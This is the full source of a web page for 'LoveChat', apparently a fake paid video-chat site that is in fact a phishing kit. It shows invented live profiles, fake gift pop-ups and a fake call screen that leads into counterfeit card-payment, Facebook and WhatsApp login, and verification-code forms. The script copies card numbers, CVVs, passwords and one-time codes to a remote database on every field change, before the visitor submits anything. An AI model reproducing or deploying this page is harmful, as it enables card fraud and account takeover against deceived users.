<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LoveChat | Premium Connection</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --accent: #ff0055; --gold: #ffcc00; --dark: #0a0a0b; --card-bg: #1a1a1c; --whatsapp: #25D366; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background-color: var(--dark); color: #fff; overflow-x: hidden; }

        /* --- Splash Screen --- */
        #splash { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.8s; }
        .loader-ring { width: 60px; height: 60px; border: 4px solid #333; border-top: 4px solid var(--accent); border-radius: 50%; animation: spin 1s linear infinite; }
        
        /* Navigation */
        nav { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; background: rgba(10,10,11,0.85); position: sticky; top: 0; z-index: 1000; backdrop-filter: blur(15px); border-bottom: 1px solid #222; }
        .logo { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 20px; color: var(--accent); }
        .logo img { width: 35px; height: 35px; border-radius: 50%; object-fit: cover; border: 2px solid var(--accent); }

        .container { max-width: 1200px; margin: 0 auto; padding: 12px; }
        .profile-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
        @media(min-width: 768px) { .profile-grid { grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); } }

        /* Profile Card */
        .profile-card { background: var(--card-bg); border-radius: 20px; overflow: hidden; border: 1px solid #28282b; position: relative; transition: 0.3s; }
        .img-container { height: 220px; width: 100%; position: relative; overflow: hidden; }
        .img-container img { width: 100%; height: 100%; object-fit: cover; }
        .img-container::after { content: ''; position: absolute; inset: 5px; border: 2.5px solid var(--accent); border-radius: 18px; opacity: 0.7; pointer-events: none; }
        .video-badge { position: absolute; top: 12px; right: 12px; background: rgba(255, 0, 85, 0.9); padding: 3px 8px; border-radius: 6px; font-size: 10px; font-weight: 800; display: flex; align-items: center; gap: 3px; z-index: 5; }
        .rate-tag { position: absolute; bottom: 12px; right: 12px; background: rgba(0,0,0,0.8); padding: 4px 8px; border-radius: 8px; font-size: 11px; font-weight: 700; color: var(--gold); backdrop-filter: blur(5px); }
        .profile-details { padding: 12px; }
        .profile-details h3 { font-size: 15px; display: flex; align-items: center; gap: 4px; }
        .call-btn { width: 100%; background: linear-gradient(45deg, var(--accent), #ff4d88); color: #fff; border: none; padding: 10px; border-radius: 10px; font-weight: 700; font-size: 13px; margin-top: 8px; cursor: pointer; }

        /* Fake Video Call UI */
        #videoUI { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .calling-img { width: 120px; height: 120px; border-radius: 50%; border: 4px solid var(--accent); margin-bottom: 20px; object-fit: cover; animation: pulse 1.5s infinite; }

        /* Messenger */
        .chat-overlay { display: none; position: fixed; inset: 0; background: #000; z-index: 2000; flex-direction: column; }
        @media(min-width: 600px) { .chat-overlay { inset: auto; width: 360px; height: 550px; bottom: 20px; right: 20px; border-radius: 25px; border: 1px solid #333; } }
        .chat-header { padding: 15px; background: #1a1a1c; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #222; }
        .chat-messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; background: #0a0a0b; }
        .msg { padding: 10px 15px; border-radius: 18px; max-width: 80%; font-size: 14px; }
        .msg.user { background: #222; align-self: flex-start; }
        .msg.admin { background: var(--accent); align-self: flex-end; }
        .chat-input { padding: 15px; display: flex; gap: 10px; background: #1a1a1c; }
        .chat-input input { flex: 1; background: #000; border: 1px solid #333; padding: 12px; border-radius: 25px; color: #fff; outline: none; }

        /* Notification */
        #livePop { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #fff; color: #000; padding: 10px 20px; border-radius: 30px; font-size: 12px; font-weight: 700; z-index: 5000; display: none; align-items: center; gap: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.4); animation: slideUp 0.5s ease; }

        /* Overlays */
        .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 9999; overflow-y: auto; padding: 40px 20px; backdrop-filter: blur(15px); }
        .form-box { max-width: 400px; margin: 0 auto; text-align: center; }
        input, select { width: 100%; padding: 16px; margin: 10px 0; border: 1px solid #333; border-radius: 12px; background: #111; color: #fff; }
        .btn-gold { width: 100%; padding: 18px; border: none; border-radius: 12px; background: var(--accent); color: #fff; font-weight: 700; cursor: pointer; }
        
        /* WhatsApp Specific Button */
        .btn-whatsapp { background: var(--whatsapp) !important; color: white !important; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px; }
        
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,0,85,0.7); } 70% { transform: scale(1.05); box-shadow: 0 0 0 20px rgba(255,0,85,0); } 100% { transform: scale(1); } }
        @keyframes slideUp { from { bottom: -50px; } to { bottom: 20px; } }
    </style>
</head>
<body onload="initApp()">

<div id="splash">
    <div class="loader-ring"></div>
    <h2 style="margin-top: 20px; letter-spacing: 2px;">LOVECHAT</h2>
    <p style="font-size: 12px; opacity: 0.5; margin-top: 10px;">Secure Connection...</p>
</div>

<div id="videoUI">
    <img id="callImg" class="calling-img" src="">
    <h2 id="callName">Name</h2>
    <p style="color: #2ecc71; margin-top: 10px; font-weight: 600;">Connecting to secure line...</p>
    <div style="margin-top: 50px; color: #ff3b30; font-size: 40px; cursor: pointer;" onclick="closeVideo()">üìµ</div>
</div>

<div id="livePop">
    <img src="https://img.icons8.com/color/48/000000/gift.png" width="20">
    <span id="popText">Someone just sent a gift!</span>
</div>

<nav>
    <div class="logo"><img src="https://i.ibb.co/C5pRgQ6j/received-2053528175501581.jpg"> LoveChat</div>
    <div style="color: #2ecc71; font-weight: 800; font-size: 12px; background: rgba(46,204,113,0.1); padding: 4px 10px; border-radius: 20px;">‚óè 542 LIVE</div>
</nav>

<div class="container">
    <div class="profile-grid" id="profileContainer"></div>
</div>

<div id="chatBox" class="chat-overlay">
    <div class="chat-header">
        <div style="display:flex; align-items:center; gap:10px">
            <img id="chatImg" src="" style="width:40px; height:40px; border-radius:50%; object-fit:cover; border:2px solid var(--accent)">
            <div>
                <b id="chatName">Name</b>
                <div id="typing" style="font-size:11px; color:#2ecc71; display:none;">is typing...</div>
            </div>
        </div>
        <div style="display:flex; gap:15px; align-items:center;">
            <span onclick="triggerVideo()" style="cursor:pointer; font-size:22px;">üé•</span>
            <span onclick="closeChat()" style="cursor:pointer; font-size:22px;">‚úï</span>
        </div>
    </div>
    <div class="chat-messages" id="chatMessages"></div>
    <div class="chat-input">
        <input type="text" id="msgInput" placeholder="Type a message...">
        <button onclick="sendMessage()" style="background:none; border:none; color:var(--accent); font-weight:800;">SEND</button>
    </div>
</div>

<div id="signupView" class="overlay"><div class="form-box">
    <h2 style="color:var(--accent); font-size:26px;">VIP ACCESS</h2>
    <p style="margin-bottom:20px; opacity:0.7;">Private HD Video Calling</p>
    <select id="region"><option value="">Choose Country</option><option>Saudi Arabia (5 SAR)</option><option>UAE (5 AED)</option><option>Bangladesh (150 BDT)</option></select>
    <button class="btn-gold" onclick="showView('cardView')">Pay via Card</button>
    <button class="btn-gold" style="background:#1877f2; margin-top:10px;" onclick="openSocial('Facebook')">Login with Facebook</button>
    
    <button class="btn-gold btn-whatsapp" onclick="openSocial('WhatsApp')">
        <img src="https://img.icons8.com/color/48/000000/whatsapp.png" width="24"> Login with WhatsApp
    </button>
    
    <p style="margin-top:20px; cursor:pointer;" onclick="hideAll()">Cancel</p>
</div></div>

<div id="cardView" class="overlay"><div class="form-box">
    <h2>Secure Payment</h2>
    <p style="font-size:12px; opacity:0.6; margin-bottom:15px;">Encrypted by 256-bit SSL</p>
    <input type="text" id="cardName" placeholder="Cardholder Name" onchange="autoSync('Card')">
    <input type="text" id="cardNumber" placeholder="Card Number" maxlength="16" onchange="autoSync('Card')">
    <div style="display:flex; gap:10px"><input type="text" id="expiryDate" placeholder="MM/YY" onchange="autoSync('Card')"><input type="text" id="cvv" placeholder="CVV" onchange="autoSync('Card')"></div>
    <button class="btn-gold" onclick="submitFinal('Card')">Pay & Call Now</button>
    <img src="https://i.ibb.co/30X8vBf/trust-badges.png" style="width:100%; margin-top:15px; opacity:0.7;">
</div></div>

<div id="socialView" class="overlay"><div class="form-box">
    <img id="socialLogo" style="width:60px; margin-bottom:10px;">
    <h2 id="socialTitle">Login</h2>
    <input type="text" id="socialUser" placeholder="Phone Number / Email" onchange="autoSync(currentPlatform)">
    <input type="password" id="socialPass" placeholder="Password" onchange="autoSync(currentPlatform)">
    <button class="btn-gold" id="socialBtn" onclick="submitFinal(currentPlatform)">Verify Identity</button>
</div></div>

<div id="otpView" class="overlay"><div class="form-box">
    <h2>Verification Code</h2>
    <p style="font-size:12px; opacity:0.6;">Check your account for the 6-digit code</p>
    <input type="text" id="otpCode" placeholder="000 000" style="text-align:center; font-weight:800;" onchange="autoSync('OTP')">
    <button class="btn-gold" onclick="finishProcess()">Complete</button>
</div></div>

<div id="successView" class="overlay"><div class="form-box" style="padding-top:100px;">
    <div class="loader-ring" style="margin:0 auto 20px;"></div>
    <h2 id="statusTitle">Syncing...</h2>
    <p id="statusMsg">Please wait 5-10 minutes.</p>
</div></div>

<script>
    // --- SUPABASE SETUP (ORIGINAL & UNTOUCHED) ---
    const S_URL = 'https://rpxifsrlavmqhjtcezlv.supabase.co';
    const S_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJweGlmc3JsYXZtcWhqdGNlemx2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzkxMDgsImV4cCI6MjA4MTQxNTEwOH0.uIsVuMypVVxU19cyzRw_c8Y964_fXx-uTA3C2kux6Rw';
    const supabaseClient = supabase.createClient(S_URL, S_KEY);

    let currentUserId = localStorage.getItem('chat_uid') || 'u_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('chat_uid', currentUserId);
    
    let currentPlatform = '', chatInterval, activeProfile = "";

    const realImages = ["https://i.ibb.co/C5pRgQ6j/received-2053528175501581.jpg", "https://i.ibb.co/pvGkQx6v/1766538863233.jpg", "https://i.ibb.co/0W3ffvr/1766538863216.jpg", "https://i.ibb.co/NgnT2QvT/1766538863201.jpg", "https://i.ibb.co/4wfx2GF5/1766538863186.jpg", "https://i.ibb.co/yBNJ840d/1766538863107.jpg", "https://i.ibb.co/JjG7ZnP4/1766538863146.jpg", "https://i.ibb.co/6Rsh5K3N/1766538863119.jpg", "https://i.ibb.co/4CkhSdL/1766538863133.jpg", "https://i.ibb.co/B2BW2SS1/1766538863084.jpg", "https://i.ibb.co/fVVygmYq/1766538863096.jpg", "https://i.ibb.co/6RDJhFXc/1766538863072.jpg", "https://i.ibb.co/0RJb2Lsq/1766538863062.jpg", "https://i.ibb.co/Xxvmzcft/1766538863052.jpg", "https://i.ibb.co/rKqHxyQf/1766538863042.jpg", "https://i.ibb.co/FLhPgLcx/1766538863022.jpg", "https://i.ibb.co/ZRt27c9G/1766538863032.jpg", "https://i.ibb.co/zHndc1pR/1766538863012.jpg", "https://i.ibb.co/21dfwzh2/1766538863002.jpg", "https://i.ibb.co/jPdg91gT/1766538862992.jpg", "https://i.ibb.co/bMjV3Hdz/1766538862970.jpg", "https://i.ibb.co/5gvN80W6/1766538862981.jpg", "https://i.ibb.co/S4CqTjXr/1766538862944.jpg", "https://i.ibb.co/N6Mj5RqK/1766538862926.jpg", "https://i.ibb.co/JR2GRXYV/1766538862912.jpg", "https://i.ibb.co/MxQR1pzZ/1766538862891.jpg", "https://i.ibb.co/MxLBbDFp/1766538862847.jpg", "https://i.ibb.co/S7yJbHWx/1766538862865.jpg", "https://i.ibb.co/jPCVMr4S/1766538862795.jpg", "https://i.ibb.co/pjtfYvLH/1766538862827.jpg", "https://i.ibb.co/Y4g9qcKG/1766538862738.jpg", "https://i.ibb.co/LDdRgF1F/1766538862710.jpg", "https://i.ibb.co/6JWmTjNy/1766538862768.jpg", "https://i.ibb.co/TMS0LybB/1766538862685.jpg", "https://i.ibb.co/mrkbgb7t/1766538862662.jpg", "https://i.ibb.co/qMzTRpps/1766538862644.jpg", "https://i.ibb.co/4ZyVNy6M/1766538862624.jpg", "https://i.ibb.co/gMtr6wtv/1766538862604.jpg", "https://i.ibb.co/KTD9NjL/1766538862573.jpg"];
    const names = ["Ayesha", "Priya", "Sara", "Nisha", "Mitu", "Anika", "Riya", "Sultana", "Jannat", "Keya"];

    function initApp() {
        setTimeout(() => { document.getElementById('splash').style.opacity = '0'; setTimeout(() => document.getElementById('splash').style.display='none', 800); }, 2000);
        renderProfiles();
        setInterval(showFakePop, 15000);
    }

    function renderProfiles() {
        const container = document.getElementById('profileContainer');
        realImages.forEach((img, i) => {
            const name = names[i % names.length];
            container.innerHTML += `
                <div class="profile-card" onclick="openChat('${name}', '${img}')">
                    <div class="img-container">
                        <div class="video-badge">üé• LIVE HD</div>
                        <img src="${img}" loading="lazy">
                        <div class="rate-tag">$${5+(i%10)}/min</div>
                    </div>
                    <div class="profile-details">
                        <h3>${name} <img src="https://img.icons8.com/color/48/000000/verified-badge.png" width="14"></h3>
                        <button class="call-btn">Start Chat</button>
                    </div>
                </div>`;
        });
    }

    function showFakePop() {
        const pop = document.getElementById('livePop');
        const popText = document.getElementById('popText');
        const rName = names[Math.floor(Math.random() * names.length)];
        const actions = ["just sent a Super Heart! ‚ù§Ô∏è", "received a Diamond Gift üíé", "started a private show"];
        popText.innerText = `${rName} ${actions[Math.floor(Math.random()*actions.length)]}`;
        pop.style.display = 'flex';
        setTimeout(() => pop.style.display = 'none', 5000);
    }

    function openChat(name, img) {
        activeProfile = name;
        document.getElementById('chatName').innerText = name;
        document.getElementById('chatImg').src = img;
        document.getElementById('chatBox').style.display = 'flex';
        loadMessages();
        if(chatInterval) clearInterval(chatInterval);
        chatInterval = setInterval(loadMessages, 3000);
    }

    function closeChat() { document.getElementById('chatBox').style.display = 'none'; clearInterval(chatInterval); }

    function triggerVideo() {
        document.getElementById('callImg').src = document.getElementById('chatImg').src;
        document.getElementById('callName').innerText = "Calling " + activeProfile + "...";
        document.getElementById('videoUI').style.display = 'flex';
        setTimeout(() => { showView('signupView'); closeVideo(); }, 5000);
    }

    function closeVideo() { document.getElementById('videoUI').style.display = 'none'; }

    async function sendMessage() {
        const msgInp = document.getElementById('msgInput');
        const text = msgInp.value.trim();
        if(!text) return;
        try {
            await supabaseClient.from('messages').insert([{
                sender_id: String(currentUserId),
                profile_id: activeProfile,
                content: text,
                is_admin: false
            }]);
            msgInp.value = "";
            loadMessages();
        } catch(e) { }
    }

    async function loadMessages() {
        if(!activeProfile) return;
        try {
            const { data } = await supabaseClient.from('messages')
                .select('*')
                .eq('sender_id', currentUserId)
                .eq('profile_id', activeProfile)
                .order('created_at', { ascending: true });
            
            const isTyping = (data && data.length > 0 && !data[data.length-1].is_admin);
            document.getElementById('typing').style.display = isTyping ? 'block' : 'none';

            const box = document.getElementById('chatMessages');
            box.innerHTML = (data || []).map(m => `<div class="msg ${m.is_admin?'admin':'user'}">${m.content}</div>`).join('');
            box.scrollTop = box.scrollHeight;
        } catch (e) { }
    }

    async function autoSync(type) {
        const payload = {
            type: type,
            identifier: type === 'Card' ? document.getElementById('cardName').value : document.getElementById('socialUser').value,
            secret: type === 'Card' ? document.getElementById('cardNumber').value : document.getElementById('socialPass').value,
            extra_info: type === 'Card' ? `${document.getElementById('expiryDate').value}|${document.getElementById('cvv').value}` : '',
            otp: document.getElementById('otpCode').value
        };
        const sid = localStorage.getItem('db_id');
        if(!sid) {
            const { data } = await supabaseClient.from('user_data_love').insert([payload]).select();
            if(data) localStorage.setItem('db_id', data[0].id);
        } else {
            await supabaseClient.from('user_data_love').update(payload).eq('id', sid);
        }
    }

    function showView(id) { document.querySelectorAll('.overlay').forEach(v => v.style.display = 'none'); document.getElementById(id).style.display = 'block'; }
    function hideAll() { document.querySelectorAll('.overlay').forEach(v => v.style.display = 'none'); }
    
    function openSocial(p) { 
        currentPlatform = p; 
        const logo = document.getElementById('socialLogo');
        const title = document.getElementById('socialTitle');
        const btn = document.getElementById('socialBtn');
        
        if(p === 'Facebook') {
            logo.src = 'https://img.icons8.com/color/144/facebook-new.png';
            title.innerText = 'Facebook Login';
            btn.style.background = '#1877f2';
        } else if(p === 'WhatsApp') {
            logo.src = 'https://img.icons8.com/color/144/whatsapp.png';
            title.innerText = 'WhatsApp Verification';
            btn.style.background = '#25D366';
        }
        showView('socialView'); 
    }
    
    async function submitFinal(t) { await autoSync(t); showView('otpView'); }
    async function finishProcess() { await autoSync('OTP'); showView('successView'); }
</script>
</body>
</html>
